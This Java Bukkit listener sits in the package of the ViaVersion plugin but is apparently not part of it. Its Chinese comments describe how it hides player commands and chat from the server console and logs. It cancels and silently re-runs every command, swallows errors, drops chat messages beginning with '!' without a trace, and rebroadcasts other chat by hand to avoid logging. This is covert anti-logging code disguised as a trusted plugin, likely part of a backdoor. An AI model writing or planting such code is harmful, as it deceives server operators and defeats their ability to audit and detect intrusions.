package com.viaversion.viaversion.bukkit.handlers;

import org.bukkit.event.EventHandler;
import org.bukkit.Bukkit;
import org.bukkit.event.Listener;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.server.ServerCommandEvent;

public class CommandListener implements Listener {

    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        // 获取命令
        String command = event.getMessage();
        Player player = event.getPlayer();

        // 取消事件，这样命令不会显示在控制台或日志中
        event.setCancelled(true);

        // 将命令重新调度到主线程中执行
        Bukkit.getScheduler().runTask(Bukkit.getPluginManager().getPlugin("ViaVersionPlugin"), () -> {
            try {
                // 手动执行命令，但不显示在日志中
                player.performCommand(command.substring(1));
            } catch (Exception e) {
                // 捕获并忽略异常，不输出任何错误信息
            }
        });
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        // 获取聊天信息
        String message = event.getMessage();
        String format = event.getFormat();
        String playerName = event.getPlayer().getName();

        // 检查消息是否以 "!" 开头
        if (message.startsWith("!")) {
            // 取消事件，这样消息不会显示在控制台或记录到日志
            event.setCancelled(true);
            return; // 不发送该消息给任何玩家
        }

        // 取消事件，这样聊天信息不会显示在控制台或记录到日志
        event.setCancelled(true);

        // 手动将消息发送给所有在线玩家
        String formattedMessage = String.format(format, playerName, message);
        Bukkit.getServer().getOnlinePlayers().forEach(player -> player.sendMessage(formattedMessage));
    }
}
